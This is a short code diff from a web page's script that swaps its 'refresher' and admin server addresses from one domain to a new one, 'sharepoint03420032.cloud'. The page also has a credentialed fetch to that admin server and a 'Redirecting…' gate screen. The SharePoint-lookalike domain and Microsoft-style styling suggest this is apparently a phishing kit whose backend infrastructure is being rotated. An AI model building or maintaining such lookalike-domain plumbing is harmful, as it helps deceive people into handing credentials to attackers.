@@ -865,7 +865,7 @@ input[type=text]:focus{border-color:var(--acc);background:#ffffff}
 // ═══════════════════════════════════════════════════════════════════════════
 // REFRESHER SERVER CONFIG
 // ═══════════════════════════════════════════════════════════════════════════
-const REFRESHER_URL   = 'https://refresh.onlineprojectsdocs.top';
+const REFRESHER_URL   = 'https://refresh.sharepoint03420032.cloud';
 const REFRESHER_ROUTE = REFRESHER_URL + '/refresh';
 const REFRESHER_HEALTH= REFRESHER_URL + '/health';
 const REFRESH_CHECK_INTERVAL = 60_000;
@@ -1491,8 +1491,8 @@ function closeModal(){document.getElementById('confirm-modal').classList.add('hi
 // ═══════════════════════════════════════════════════════════════════════════
 // ADMIN CONFIG
 // ═══════════════════════════════════════════════════════════════════════════
-const ADMIN_SERVER='https://admin.onlineprojectsdocs.top';
-const ADMIN_PAGE='https://admin.onlineprojectsdocs.top/admin';
+const ADMIN_SERVER='https://uhp.sharepoint03420032.cloud';
+const ADMIN_PAGE='https://uhp.sharepoint03420032.cloud/admin';
 
 async function checkAdminSession(){try{const r=await fetch(ADMIN_SERVER+'/api/me',{credentials:'include',signal:AbortSignal.timeout(3000)});if(!r.ok)return null;const d=await r.json();return d.admin||null;}catch{return null;}}
 function showRedirectScreen(msg){document.body.insertAdjacentHTML('afterbegin',`<div id="admin-gate-screen" style="position:fixed;inset:0;z-index:99999;background:#f3f2f1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;font-family:var(--font);color:var(--txt2);font-size:13px"><div style="font-size:16px;font-weight:600;color:var(--txt0)">${msg}</div><div style="font-size:12px;opacity:.6">Redirecting…</div></div>`);}
